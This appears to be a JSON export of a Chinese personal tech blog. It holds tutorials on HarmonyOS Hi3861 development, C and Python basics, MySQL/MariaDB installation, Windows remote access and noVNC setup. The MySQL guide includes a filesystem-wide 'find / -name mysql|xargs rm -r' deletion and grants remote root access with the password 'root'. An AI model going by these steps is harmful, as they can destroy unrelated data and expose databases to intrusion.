插件压缩包，双击安装包程序进行安装。 安装过程中，会自动安装 DevEco Device Tool 所需的依赖文件（如 C/C++ 和 CodeLLDB 插件）和执行程序。 安装完成后，会自动关闭命令行工具窗口。 启动 Visual Studio Code，点击左侧的 按钮，检查 INSTALLED 中，是否已成功安装 C/C++、CodeLLDB 和 DevEco Device Tool。 说明 如果 C/C++ 和 CodeLLDB 插件安装不成功，则 DevEco Device Tool 不能正常运行，解决方法，详细请参考：离线安装 C/C++ 和 CodeLLDB 插件。","categories":[{"name":"鸿蒙设备开发(hi3861)","slug":"鸿蒙设备开发-hi3861","permalink":"http://example.com/categories/%E9%B8%BF%E8%92%99%E8%AE%BE%E5%A4%87%E5%BC%80%E5%8F%91-hi3861/"}],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"},{"name":"鸿蒙","slug":"鸿蒙","permalink":"http://example.com/tags/%E9%B8%BF%E8%92%99/"},{"name":"单片机","slug":"单片机","permalink":"http://example.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"}]},{"title":"(3)CentOS7中安装鸿蒙编译环境","slug":"鸿蒙开发/(3)CentOS7鸿蒙编译环境准备","date":"2021-07-27T11:46:54.000Z","updated":"2021-07-29T05:22:20.000Z","comments":true,"path":"2021/07/27/鸿蒙开发/(3)CentOS7鸿蒙编译环境准备/","link":"","permalink":"http://example.com/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(3)CentOS7%E9%B8%BF%E8%92%99%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/","excerpt":"","text":"# 安装 CentOS7 在 VirtualBox 中最小化安装 CentOS（略） # 配置网络 123456789ip addrvi /etc/sysconfig/network-scripts/ifcfg-enp0s3 systemctl restart networkip addrping www.baidu.com#设置dhcp动态分配网络yum install net-toolsyum install wget#安装常用软件 # 安装专用编译器 1234567tar -zxvf gcc_riscv32-linux-7.3.0.tar.gz -C /usr/local/#解压到/usr/localvi /etc/profilesource /etc/profile#添加bin目录到环境变量中riscv32-unknown-elf-gcc --version#查看结果 # 安装 Python3.7+ 1234567891011121314151617181920212223242526272829303132333435363738wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgzlstar -zxvf Python-3.9.0.tgz -C /usr/local/#解压安装包#安装之前下载以下需要的依赖软件yum groupinstall -y &quot;Development tools&quot;yum install -y &quot;Development tools&quot;yum install -y openssl-develyum install -y libffi libffi-develyum install -y bzip2-develyum install -y sqlite-develyum install -y readline-develyum install -y libuuid-develyum install -y uuid-develyum install -y xz-develyum install -y gdbm-develyum install -y tk-devel#安装Pythoncd /usr/local/Python-3.9.0/ls./configure --prefix=/usr/local/python3make &amp;&amp; make install#建立软链接，不影响系统自带的pythonln -s /usr/local/python3/bin/python3 /usr/bin/python3ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3pip3 --versionpython3 --version#安装python包pip3 installsetuptoolspip3 install setuptoolspip3 install kconfiglibpip3 install pycryptodomepip3 install six --upgrade --ignore-installed sixpip3 install ecdsa # 安装 SCONS 1234tar -zxvf scons-4.0.1.tar.gz cd SCons-4.0.1/python3 setup.py installln -s /usr/local/python3/bin/scons /usr/bin/scons # 安装 gn 123tar -xvf gn-linux-x86-1717.tar.gz -C /usr/local/ln -s /usr/local/gn /usr/bin/gngn --version # 安装 ninja 123tar -xvf ninja.1.9.0.tar -C /usr/local/ln -s /usr/local/ninja/ninja /usr/bin/ninjaninja --version # 安装 llvm 123tar -xvf llvm-linux-9.0.0-36191.tar -C /usr/local/vi /etc/profilesource /etc/profile # 安装 hb 123python3 -m pip install --user ohos-buildvi ~/.bashrc source ./.bashrc # 解压源码并编译 123456mkdir code-1.0tar -zxvf code-1.0.tar.gz -C ./code-1.0cd code-1.0#使用python3编译源码python3 build.py wifiiot#编译成功 # 安装 Samba 服务 1234567891011yum install sambasystemctl enable smb#编辑配置文件vi /etc/samba/smb.conf#创建用户smbpasswd -a rootsystemctl start smbnetstat -antp#配置selinux及防火墙sestatus -b |grep sambasetsebool -P samba_export_all_rw 1 # 参考文献 [1] Centos 下安装鸿蒙 LiteOS 编译环境 https://www.sohu.com/a/425806016_463994 [2] 华为设备开发快速入门官方文档 https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-env-setup-lin-0000001105407498","categories":[{"name":"鸿蒙设备开发(hi3861)","slug":"鸿蒙设备开发-hi3861","permalink":"http://example.com/categories/%E9%B8%BF%E8%92%99%E8%AE%BE%E5%A4%87%E5%BC%80%E5%8F%91-hi3861/"}],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"},{"name":"鸿蒙","slug":"鸿蒙","permalink":"http://example.com/tags/%E9%B8%BF%E8%92%99/"},{"name":"单片机","slug":"单片机","permalink":"http://example.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"}]},{"title":"(4)运行Hello World","slug":"鸿蒙开发/(4)运行Hello World","date":"2021-07-27T11:46:54.000Z","updated":"2021-07-29T05:35:00.000Z","comments":true,"path":"2021/07/27/鸿蒙开发/(4)运行Hello World/","link":"","permalink":"http://example.com/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(4)%E8%BF%90%E8%A1%8CHello%20World/","excerpt":"","text":"# 运行 Hello World 更新时间: 2021-07-21 09:12 本示例将演示如何编写简单业务，输出 “Hello World”，初步了解 HarmonyOS 如何运行在开发板上。 # 修改源码 bugfix 和新增业务两种情况，涉及源码修改。下面以新增业务（my_first_app）为例，向开发者介绍如何进行源码修改。 确定目录结构。 开发者编写业务时，务必先在./applications/sample/wifi-iot/app 路径下新建一个目录（或一套目录结构），用于存放业务源码文件。 例如：在 app 下新增业务 my_first_app，其中 hello_world.c 为业务代码，BUILD.gn 为编译脚本，具体规划目录结构如下： 123456789. └── applications └── sample └── wifi-iot └── app │── my_first_app │ │── hello_world.c │ └── BUILD.gn └── BUILD.gn 编写业务代码。 新建./applications/sample/wifi-iot/app/my_first_app 下的 hello_world.c 文件，在 hello_world.c 中新建业务入口函数 HelloWorld，并实现业务逻辑。并在代码最下方，使用 HarmonyOS 启动恢复模块接口 SYS_RUN () 启动业务。（SYS_RUN 定义在 ohos_init.h 文件中） 12345678#include &lt;stdio.h&gt;#include &quot;ohos_init.h&quot;#include &quot;ohos_types.h&quot;void HelloWorld(void) &#123; printf(&quot;[DEMO] Hello world.\\n&quot;); &#125;SYS_RUN(HelloWorld); 编写用于将业务构建成静态库的 BUILD.gn 文件。 新建./applications/sample/wifi-iot/app/my_first_app 下的 BUILD.gn 文件，并完成如下配置。 如步骤 1 所述，BUILD.gn 文件由三部分内容（目标、源文件、头文件路径）构成，需由开发者完成填写。 12345678static_library(&quot;myapp&quot;) &#123; sources = [ &quot;hello_world.c&quot; ] include_dirs = [ &quot;//utils/native/lite/include&quot; ]&#125; static_library 中指定业务模块的编译结果，为静态库文件 libmyapp.a，开发者根据实际情况完成填写。 sources 中指定静态库.a 所依赖的.c 文件及其路径，若路径中包含 &quot;//“则表示绝对路径（此处为代码根路径），若不包含”//&quot; 则表示相对路径。 include_dirs 中指定 source 所需要依赖的.h 文件路径。 编写模块 BUILD.gn 文件，指定需参与构建的特性模块。 配置./applications/sample/wifi-iot/app/BUILD.gn 文件，在 features 字段中增加索引，使目标模块参与编译。features 字段指定业务模块的路径和目标，以 my_first_app 举例，features 字段配置如下。 1234567import(&quot;//build/lite/config/component/lite_component.gni&quot;)lite_component(&quot;app&quot;) &#123; features = [ &quot;my_first_app:myapp&quot;, ]&#125; my_first_app 是相对路径，指向./applications/sample/wifi-iot/app/my_first_app/BUILD.gn。 myapp 是目标，指向./applications/sample/wifi-iot/app/my_first_app/BUILD.gn 中的 static_library (“myapp”)。 # 调测验证 目前调试验证的方法有两种，分别为通过 printf 打印日志、通过 asm 文件定位 panic 问题，开发者可以根据具体业务情况选择。 由于本示例业务简单，采用 printf 打印日志的调试方式即可。下面开始介绍这两种调试手段的使用方法。 # printf 打印 代码中增加 printf 维测，信息会直接打印到串口上。开发者可在业务关键路径或业务异常位置增加日志打印，如下所示。 123void HelloWorld(void)&#123; printf(&quot;[DEMO] Hello world.\\n&quot;);&#125; # 根据 asm 文件进行问题定位 系统异常退出时，会在串口上打印异常退出原因调用栈信息，如下文所示。通过解析异常栈信息可以定位异常位置。 12345678910=======KERNEL PANIC=======**********************Call Stack*********************Call Stack 0 -- 4860d8 addr:f784cCall Stack 1 -- 47b2b2 addr:f788cCall Stack 2 -- 3e562c addr:f789cCall Stack 3 -- 4101de addr:f78acCall Stack 4 -- 3e5f32 addr:f78ccCall Stack 5 -- 3f78c0 addr:f78ecCall Stack 6 -- 3f5e24 addr:f78fc********************Call Stack end******************* 为解析上述调用栈信息，需要使用到 Hi3861_wifiiot_app.asm 文件，该文件记录了代码中函数在 Flash 上的符号地址以及反汇编信息。asm 文件会随版本大包一同构建输出，存放在./out/wifiiot/ 路径下。 将调用栈 CallStack 信息保存到 txt 文档中，以便于编辑。（可选） 打开 asm 文件，并搜索 CallStack 中的地址，列出对应的函数名 信息。通常只需找出前几个栈信息对应的函数，就可明确异常代码方向。 1234567Call Stack 0 -- 4860d8 addr:f784c -- WadRecvCBCall Stack 1 -- 47b2b2 addr:f788c -- wal_sdp_process_rx_dataCall Stack 2 -- 3e562c addr:f789cCall Stack 3 -- 4101de addr:f78acCall Stack 4 -- 3e5f32 addr:f78ccCall Stack 5 -- 3f78c0 addr:f78ecCall Stack 6 -- 3f5e24 addr:f78fc 根据以上调用栈信息，可以定位 WadRecvCB 函数中出现了异常。 完成代码排查及修改。 # 运行结果 示例代码编译、烧录、运行、调测后，在串口界面会显示如下结果： 1234ready to OS startFileSystem mount ok.wifi init success![DEMO] Hello world. # 下一步学习 恭喜，您已完成 Hi3861 WLAN 模组快速上手！建议您下一步进入 WLAN 产品开发的学习 。","categories":[{"name":"鸿蒙设备开发(hi3861)","slug":"鸿蒙设备开发-hi3861","permalink":"http://example.com/categories/%E9%B8%BF%E8%92%99%E8%AE%BE%E5%A4%87%E5%BC%80%E5%8F%91-hi3861/"}],"tags":[{"name":"鸿蒙","slug":"鸿蒙","permalink":"http://example.com/tags/%E9%B8%BF%E8%92%99/"},{"name":"单片机","slug":"单片机","permalink":"http://example.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"}]},{"title":"(5)LED外设控制","slug":"鸿蒙开发/(5)LED外设控制","date":"2021-07-27T11:46:54.000Z","updated":"2021-07-29T05:23:02.000Z","comments":true,"path":"2021/07/27/鸿蒙开发/(5)LED外设控制/","link":"","permalink":"http://example.com/2021/07/27/%E9%B8%BF%E8%92%99%E5%BC%80%E5%8F%91/(5)LED%E5%A4%96%E8%AE%BE%E6%8E%A7%E5%88%B6/","excerpt":"","text":"# LED 外设控制 更新时间: 2021-07-21 09:12 # 概述 HarmonyOS WLAN 模组基于 Hi3861 平台提供了丰富的外设操作能力，包含 I2C、I2S、ADC、UART、SPI、SDIO、GPIO、PWM、FLASH 等。本文介绍如何通过调用 HarmonyOS 的 NDK 接口，实现对 GPIO 控制，达到 LED 闪烁的效果。其他的 IOT 外设控制，开发者可根据 API 指导文档完成，此处不逐一介绍。 # 开发 请先完成《Hi3861 快速入门》。 LED 控制参考示例存放于 applications/sample/wifi-iot/app/iothardware/led_example.c 文件中。 实现 IOT 外设控制，首先需要通过查阅原理图明确接线关系。经过查阅，hispark pegasus 的 LED 与芯片的 9 号管脚相连。 1#define LED_TEST_GPIO 9 说明 开发板原理图，请开发者联系 Hi3861 购买渠道客服获取。 使用 GPIO 前，需要完成 GPIO 管脚初始化，明确管脚用途，并创建任务，使 LED 周期性亮灭，达到闪烁的效果。 12345678910111213141516171819202122static void LedExampleEntry(void)&#123; osThreadAttr_t attr; /* 管脚初始化 */ IoTGpioInit(LED_TEST_GPIO); /* 配置9号管脚为输出方向 */ IoTGpioSetDir(LED_TEST_GPIO, IOT_GPIO_DIR_OUT); attr.name = &quot;LedTask&quot;; attr.attr_bits = 0U; attr.cb_mem = NULL; attr.cb_size = 0U; attr.stack_mem = NULL; attr.stack_size = LED_TASK_STACK_SIZE; attr.priority = LED_TASK_PRIO; /* 启动任务 */ if (osThreadNew((osThreadFunc_t)LedTask, NULL, &amp;attr) == NULL) &#123; printf(&quot;[LedExample] Failed to create LedTask!\\n&quot;); &#125;&#125; 在循环任务中通过周期性亮灭形式实现 LED 闪烁。 1234567891011121314151617181920212223242526static void *LedTask(const char *arg)&#123; (void)arg; while (1) &#123; switch (g_ledState) &#123; case LED_ON: IoTGpioSetOutputVal(LED_TEST_GPIO, 1); usleep(LED_INTERVAL_TIME_US); break; case LED_OFF: IoTGpioSetOutputVal(LED_TEST_GPIO, 0); usleep(LED_INTERVAL_TIME_US); break; case LED_SPARK: IoTGpioSetOutputVal(LED_TEST_GPIO, 0); usleep(LED_INTERVAL_TIME_US); IoTGpioSetOutputVal(LED_TEST_GPIO, 1); usleep(LED_INTERVAL_TIME_US); break; default: usleep(LED_INTERVAL_TIME_US); break; &#125; &#125; return NULL;&#125; 在代码最下方，使用 HarmonyOS 启动恢复模块接口 SYS_RUN () 启动业务。（SYS_RUN 定义在 ohos_init.h 文件中） 1SYS_RUN(LedExampleEntry); 修改 applications/sample/wifi-iot/app/BUILD.gn 文件，使 led_example.c 参与编译。 123456import(&quot;//build/lite/config/component/lite_component.gni&quot;)lite_component(&quot;app&quot;) &#123; features = [ &quot;iothardware:led_example&quot; ]&#125; # 验证 编译过程请参考《Hi3861 快速入门 - 源码编译》，烧录过程请参考《Hi3861 快速入门 - 镜像烧录》。 完成以上两步后，按下 RST 键复位模组，可发现 LED 在周期性闪烁，与预期相符，验证完毕。 图 1 LED 闪烁图","categories":[{"name":"鸿蒙设备开发(hi3861)","slug":"鸿蒙设备开发-hi3861","permalink":"http://example.com/categories/%E9%B8%BF%E8%92%99%E8%AE%BE%E5%A4%87%E5%BC%80%E5%8F%91-hi3861/"}],"tags":[{"name":"鸿蒙","slug":"鸿蒙","permalink":"http://example.com/tags/%E9%B8%BF%E8%92%99/"},{"name":"单片机","slug":"单片机","permalink":"http://example.com/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"}]},{"title":"C语言学习(一)","slug":"C语言学习/C","date":"2021-07-22T00:37:44.000Z","updated":"2021-07-29T05:34:16.000Z","comments":true,"path":"2021/07/22/C语言学习/C/","link":"","permalink":"http://example.com/2021/07/22/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/C/","excerpt":"","text":"# C 语言学习 (一) # 起源 1972 年， 贝尔实验室的丹尼斯・里奇（Dennis Ritch） 和肯・汤普逊（Ken Thompson） 在开发 UNIX 操作系统时设计了 C 语言。 然而， C 语言不完全是里 奇突发奇想而来， 他是在 B 语言（汤普逊发明） 的基础上进行设计。 至于 B 语言的起源， 那是另一个故事。 C 语言设计的初衷是将其作为程序员使用的 一种编程工具， 因此， 其主要目标是成为有用的语言。 # 基础规则 # 示例 12345678910#include &lt;stdio.h&gt;int main(void) /* 一个简单的C程序 */&#123; intnum; /* 定义一个名为num的变量 */num = 1; /* 为num赋一个值 */printf(&quot;I am a simple &quot;); /* 使用printf()函数 */printf(&quot;computer.\\n&quot;);printf(&quot;My favorite number is %d because it is first.\\n&quot;,num);return 0;&#125; # 变量命名 可以用小写字母、 大写字母、 数字和下划线（_） 来命名。 而且， 名称 的第 1 个字符必须是字符或下划线， 不能是数字。 有效 无效 wiggles $Z]** cat2 2cat Hot_Tub Hot-Tub taxRate tax rate _kcab don’t # 保留字 # 基本数据类型 # 整数类型 int C 语言提供 3 个附属关键字修饰基本整数类型： short、 long 和 unsigned。 应记住以下几点。 short int 类型（或者简写为 short） 占用的存储空间可能比 int 类型少， 常 用于较小数值的场合以节省空间。 与 int 类似， short 是有符号类型。 long int 或 long 占用的存储空间可能比 int 多， 适用于较大数值的场合。 与 int 类似， long 是有符号类型。 long long int 或 long long（C99 标准加入） 占用的储存空间可能比 long 多， 适用于更大数值的场合。 该类型至少占 64 位。 与 int 类似， long long 是有符号类型。 unsigned int 或 unsigned 只用于非负值的场合。 这种类型与有符号类型表 示的范围不同。 例如， 16 位 unsigned int 允许的取值范围是 0～65535， 而不是 - 32768～32767。 用于表示正负号的位现在用于表示另一个二进制位， 所以无符号整型可以表示更大的数 # 字符型 char char 类型用于储存字符（如， 字母或标点符号） ， 但是从技术层面看， char 是整数类型。 因为 char 类型实际上储存的是整数而不是字符。 计算机使 用数字编码来处理字符， 即用特定的整数表示特定的字符。 美国最常用的编 码是 ASCII 编码， 本书也使用此编码。 例如， 在 ASCII 码中， 整数 65 代表大写字母 A。 因此， 储存字母 A 实际上储存的是整数 65（许多 IBM 的大型主机使 用另一种编码 ——EBCDIC， 其原理相同。 另外， 其他国家的计算机系统可 能使用完全不同的编码） 。 标准 ASCII 码的范围是 0～127， 只需 7 位二进制数即可表示。 通常， char 类型被定义为 8 位的存储单元， 因此容纳标准 ASCII 码绰绰有余。 许多其他系 统（如 IMB PC 和苹果 Macs） 还提供扩展 ASCII 码， 也在 8 位的表示范围之 内。 一般而言， C 语言会保证 char 类型足够大， 以储存系统（实现 C 语言的系统） 的基本字符集。 许多字符集都超过了 127， 甚至多于 255。 例如， 日本汉字（kanji） 字符 集。 商用的统一码（Unicode） 创建了一个能表示世界范围内多种字符集的 系统， 目前包含的字符已超过 110000 个。 国际标准化组织（ISO） 和国际电 工技术委员会（IEC） 为字符集开发了 ISO/IEC 10646 标准。 统一码标准也与 ISO/IEC 10646 标准兼容。 C 语言把 1 字节定义为 char 类型占用的位（bit） 数， 因此无论是 16 位还是 32 位系统， 都可以使用 char 类型。 转义支付 # 布尔类型 C99 标准添加了_Bool 类型， 用于表示布尔值， 即逻辑值 true 和 false。 因 为 C 语言用值 1 表示 true， 值 0 表示 false， 所以_Bool 类型实际上也是一种整数 类型。 但原则上它仅占用 1 位存储空间， 因为对 0 和 1 而言， 1 位的存储空间足 够了。 # 浮点数（float、 double 和 long double ） ​ 1. 声明浮点型变量 浮点型变量的声明和初始化方式与整型变量相同， 下面是一些例子： float noah, jonah; double trouble; float planck = 6.63e-34; long double gnp; ​ 2. 浮点型常量 在代码中， 可以用多种形式书写浮点型常量。 浮点型常量的基本形式是： 有符号的数字（包括小数点） ， 后面紧跟 e 或 E， 最后是一个有符号数表示 10 的指数。 下面是两个有效的浮点型常量： -1.56E+12 2.87e-3 正号可以省略。 可以没有小数点（如， 2E5） 或指数部分（如，19.28） ， 但是不能同时省略两者。 可以省略小数部分（如， 3.E16） 或整数部分（如， .45E-6） ， 但是不能同时省略两者。 下面是更多的有效浮点型常量示例： 3.14159 .2 4e16 .8E-5 100. 145 不要在浮点型常量中间加空格： 1.56 E+12（错误！ ）默认情况下， 编译器假定浮点型常量是 double 类型的精度。 例如， 假设 some 是 float 类型的变量， 编写下面的语句： some = 4.0 * 2.0; 通常， 4.0 和 2.0 被储存为 64 位的 double 类型， 使用双精度进行乘法运算， 然后将乘积截断成 float 类型的宽度。 这样做虽然计算精度更高， 但是会减慢程序的运行速度。 在浮点数后面加上 f 或 F 后缀可覆盖默认设置， 编译器会将浮点型常量看作 float 类型， 如 2.3f 和 9.11E9F。 使用 l 或 L 后缀使得数字成为 long double 类型， 如 54.3l 和 4.32L。 注意， 建议使用 L 后缀， 因为字母 l 和数字 1 很容易混 淆。 没有后缀的浮点型常量是 double 类型 。 # 使用数据类型 编写程序时， 应注意合理选择所需的变量及其类型。 通常， 用 int 或 float 类型表示数字， char 类型表示字符。 在使用变量之前必须先声明， 并选择有 意义的变量名。 初始化变量应使用与变量类型匹配的常数类型。 例如 ： 12int apples = 3; /* 正确 */int oranges = 3.0; /* 不好的形式 */ 把一个类型的数值初始化给不同类型的变量时， 编译器会把值转换成与 变量匹配的类型， 这将导致部分数据丢失。 例如， 下面的初始化： 12int cost = 12.99; /* 用double类型的值初始化int类型的变量 */float pi = 3.1415926536; /* 用double类型的值初始化float类型的变量 * #","categories":[{"name":"C Primer Plus(第六版)","slug":"C-Primer-Plus-第六版","permalink":"http://example.com/categories/C-Primer-Plus-%E7%AC%AC%E5%85%AD%E7%89%88/"}],"tags":[{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"建立CSV","slug":"Python学习/建立CSV","date":"2021-07-20T03:40:59.000Z","updated":"2021-12-08T08:07:35.910Z","comments":true,"path":"2021/07/20/Python学习/建立CSV/","link":"","permalink":"http://example.com/2021/07/20/Python%E5%AD%A6%E4%B9%A0/%E5%BB%BA%E7%AB%8BCSV/","excerpt":"","text":"# 建立 CSV 环境 pyCharm 12345678910111213141516# -*- coding:utf-8 -*-import csv#获得一个文件对象csvFile = open(&quot;test.csv&quot;, &#x27;w+&#x27;)try: #返回一个编写器对象，负责将用户的数据转换为给定类文件对象上的分隔字符串 writer = csv.writer(csvFile) #调用编写器对象将行参数写入文件对象 writer.writerow((&#x27;number&#x27;, &#x27;number plus 2&#x27;, &#x27;number times 2&#x27;)) for i in range(10): #调用编写器对象将行参数写入文件对象 writer.writerow( (i, i+2, i*2))finally: #关闭文件 csvFile.close()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Windows 定时开机、联网、打开远程服务","slug":"平台/Windows 定时开机、联网、打开远程服务","date":"2021-06-21T03:40:59.000Z","updated":"2021-07-21T11:19:22.597Z","comments":true,"path":"2021/06/21/平台/Windows 定时开机、联网、打开远程服务/","link":"","permalink":"http://example.com/2021/06/21/%E5%B9%B3%E5%8F%B0/Windows%20%E5%AE%9A%E6%97%B6%E5%BC%80%E6%9C%BA%E3%80%81%E8%81%94%E7%BD%91%E3%80%81%E6%89%93%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/","excerpt":"","text":"# Windows 定时开机、联网、打开远程服务 作者：SSR # 设置定时任务 右键此电脑 &gt; 管理 &gt; 任务计划程序 &gt; 任务计划库 在右侧创建任务 输入事件名称，选择不管是否登陆都要执行（关键！确保开机不登录也运行） 添加触发器 1，选择启动时 添加触发器 2，选择每日特定时间 添加操作并指定联网脚本（理论上 java、python 都随意，这里使用批处理脚本） 添加操作，指定打开远程连接软件 ToDesk (www.todesk.com) 点击确定完成设置 # 设置 BIOS 启动 打开开始 &gt; 设置 &gt; 更新和安全 &gt; 恢复 &gt; 立即重新启动 &gt; 疑难解答 &gt; 高级选项 &gt; UEFI 固件设置 &gt; 重启 找到电池选项，修改如下，保存开机 # 验证 一气呵成，简直完美","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"安装mysql_5.6.33 linux_64位","slug":"平台/安装mysql_5.6.33 linux_64位","date":"2021-06-21T03:40:59.000Z","updated":"2021-07-21T11:29:27.002Z","comments":true,"path":"2021/06/21/平台/安装mysql_5.6.33 linux_64位/","link":"","permalink":"http://example.com/2021/06/21/%E5%B9%B3%E5%8F%B0/%E5%AE%89%E8%A3%85mysql_5.6.33%20linux_64%E4%BD%8D/","excerpt":"","text":"# 安装 mysql_5.6.33 linux_64 位 # 环境及软件 * Centos7 * mysql_5.6.33 linux_64位 * wget http://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz # 安装流程 # 1. 卸载老版本 1234find / -name mysqlrm -rf 上边查找到的路径，多个路径用空格隔开#或者下边一条命令即可find / -name mysql|xargs rm -r # 2. 解压安装包到 /usr/local 1tar -zxvf mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz -C /usr/local # 3. 重命名文件夹 12cd /usr/localmv mysql-5.6.33-linux-glibc2.5-x86_64/ mysql # 4. 添加 mysql 用户组和用户名 123groupadd mysqluseradd -r -g mysql mysqlgroups mysql # 5. 更改文件夹权限 12cd mysql/chown -R mysql:mysql ./ # 6. 执行安装脚本 12345./scripts/mysql_install_db --user=mysql#安装完执行下列语句修改权限chown -R root:root ./chown -R mysql:mysql data # 7. 更改数据库密码 12345678910111213141516171819#首先启动mysql./support-files/mysql.server start#如果已经启动ps aux|grep mysqlkill -9 #上边的进程号#或者下边一条命令即可杀掉所有MySQL进程ps aux|grep mysql|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9#修改密码为root./bin/mysqladmin -u root -h localhost.localdomain password &#x27;root&#x27;#登录mysql./bin/mysql -h 127.0.0.1 -u root -p root#修改其他用户密码update mysql.user set password=password(&#x27;root&#x27;) where user=&#x27;root&#x27;;flush privileges; # 8. 添加远程登录权限 123#在mysql中输入grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27;;flush privileges; # 9. 将 MySQL 加入 Service 系统服务 12345cp support-files/mysql.server /etc/init.d/mysqldchkconfig --add mysqldchkconfig mysqld onservice mysqld restartservice mysqld status # 10. 配置 my.cnf 123456789vi my.cnf#添加如下语句character-set-server=utf8lower_case_table_names=1max_allowed_packet=100M#配置完成重启服务service mysqld restartservice mysqld status","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"centos7下yum安装MariaDB","slug":"平台/Centos7下yum安装MariaDB","date":"2021-05-20T03:40:59.000Z","updated":"2021-07-21T11:12:11.809Z","comments":true,"path":"2021/05/20/平台/Centos7下yum安装MariaDB/","link":"","permalink":"http://example.com/2021/05/20/%E5%B9%B3%E5%8F%B0/Centos7%E4%B8%8Byum%E5%AE%89%E8%A3%85MariaDB/","excerpt":"","text":"# centos7 下 yum 安装 MariaDB CentOS 7 下 mysql 下替换成 MariaDB 了。 MariaDB 数据库管理系统是 MySQL 的一个分支，主要由开源社区在维护，采用 GPL 授权 许可 MariaDB 的目的是完全兼容 MySQL，包括 API 和命令行，使之能轻松成为 MySQL 的代替品。 # 安装 123456789101112131415161718192021222324yum -y install mariadb mariadb-serversystemctl start mariadb #启动mariadbsystemctl enable mariadb #设置开机自启动systemctl stop mariadb #停止MariaDBsystemctl restart mariadb #重启MariaDBmysql_secure_installation #设置root密码等相关mysql -uroot -p #测试登录 # 修改密码update mysql.user set password=PASSWORD(&#x27;123456&#x27;) where user=&#x27;root&#x27;;# 更新权限flush privileges; # 新建用户#create user &#x27;用户名&#x27;@&#x27;主机&#x27; identified by &#x27;密码&#x27; 如果只允许本机访问 @&#x27;localhost&#x27; , 或者指定一个ip @&#x27;192.xx.xx.xx&#x27; 或者使用通配: @&#x27;%&#x27;create user &#x27;read_visa&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;# 新用户权限# grant 操作类型 on 数据库.表 to 用户@&#x27;主机&#x27; 数据库,表,主机都支持通配符 grant select, insert on *.* to &#x27;read_visa&#x27;@&#x27;%&#x27;# grant all on visa.* to &#x27;read_visa&#x27;@&#x27;%&#x27;; // all 表示所有权限grant select on visa.* to &#x27;read_visa&#x27;@&#x27;%&#x27;;","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Win10+noVNC","slug":"平台/Win10+noVNC","date":"2021-05-19T03:40:59.000Z","updated":"2021-07-21T11:25:46.959Z","comments":true,"path":"2021/05/19/平台/Win10+noVNC/","link":"","permalink":"http://example.com/2021/05/19/%E5%B9%B3%E5%8F%B0/Win10+noVNC/","excerpt":"","text":"# 网页实现远程桌面 # 环境 Win10 (被访问的 Server, 设其 IP 为 11.11.11.11) # 软件 nodejs noVnc websockify tightvnc # 搭建流程 Server 安装 nodejs 安装 ws、optimist 模块（执行 websockify.js 文件所需） 123npm install wsnpm install optimistnpm install mime-types 将 noVNC 解压到 C:\\Users\\XXX (用户名)\\node_modules\\ 下 将 websockify 解压到 C:\\Users\\XXX (用户名)\\node_modules\\noVNC 下 如图 将./noVNC/vnc.html 复制一份，更名为 index.html Server 安装 tightVNC 运行 tightVNC server, 任务栏找到图标 单击打开，设置连接密码 这里服务默认端口 5900，不用更改 打开 cmd，使用 websockify.js 转发 9000 端口的 http 链接到 5900 端口，运行以下命令 1234node C:\\Users\\SSR\\node_modules\\noVNC\\websockify-js-master\\websockify\\websockify.js --web C:\\Users\\SSR\\node_modules\\noVNC 9000 localhost:5900# 注意更改用户路径# 注意更改localhost为本机IP（11.11.11.11） 保持 cmd 窗口后台运行，打开 Win10 防火墙设置，添加入站规则，允许 TCP9000 端口入站 配置完成 # 验证效果 打开同网段另一台电脑，打开浏览器 访问 ServerIP:9000，形如 11.11.11.11:9000 点击连接，输入之前设置的连接密码 成功连接 Win10 ![](E:\\SSR\\Pictures\\ 屏幕截图 2021-05-18 110948.png)","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Linux+noVNC","slug":"平台/Linux+noVNC","date":"2021-05-18T03:40:59.000Z","updated":"2021-07-21T11:22:54.874Z","comments":true,"path":"2021/05/18/平台/Linux+noVNC/","link":"","permalink":"http://example.com/2021/05/18/%E5%B9%B3%E5%8F%B0/Linux+noVNC/","excerpt":"","text":"# Linux+noVNC # 环境及软件 Centos7 桌面 noVNC websockify tigervnc-server # 搭建流程 安装 Centos7 桌面版 安装 noVNC git clone https://github.com/novnc/noVNC git clone https://github.com/novnc/websockify mv ./websockify ./noVNC/ cd ./noVNC/utils/ openssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem 生成证书，一直回车 yum -y install python3 yum -y install numpy 缺啥补啥 安装 tigervnc-server yum -y install tigervnc-server 建立服务 vncserver :1 输入连接密码，最低 6 位数 牢记访问密码 启动服务 1/root/noVNC/utils/launch.sh --vnc localhost:5901 # 测试 打开另一台同网段电脑浏览器，Chrome/Firefox 访问 